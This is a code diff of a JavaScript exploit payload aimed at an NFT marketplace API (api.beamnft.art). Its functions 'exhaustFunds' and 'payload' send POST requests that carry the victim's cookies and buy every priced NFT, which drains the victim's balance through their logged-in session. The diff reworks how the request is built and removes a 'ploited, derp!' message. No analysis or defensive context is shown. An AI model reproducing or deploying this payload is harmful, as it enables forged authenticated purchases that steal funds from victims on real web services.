@@ -1,13 +1,12 @@
 buyNft = async (id, price) => {
-  const data = { nft_id: id, price: price };
+  let url = `https://api.beamnft.art/nft/buy/${id}?price=${price}`;
 
-  const nftBought = await fetch(`https://api.beamnft.art/nft/buy/${id}`, {
+  const nftBought = await fetch(url, {
     method: "POST",
     headers: {
       "Access-Control-Request-Headers": "*",
     },
     credentials: "include",
-    body: JSON.stringify(data),
   });
 
   console.log(`NFT ID: ${id}`);
@@ -31,7 +30,7 @@ exhaustFunds = async (balance, nfts) => {
   for (let key in nfts) {
     if (nfts[key].price != 0) {
       let bought = await buyNft(nfts[key]._id, nfts[key].price);
-      console.log(bought);
+      console.log(bought); // response to POST request
     }
   }
 };
@@ -70,7 +69,6 @@ payload = async () => {
   let nfts = nftData.result.nfts; // object containing nft data
 
   exhaustFunds(balance, nfts);
-  console.log("\nploited, derp!");
 };
 
 payload();
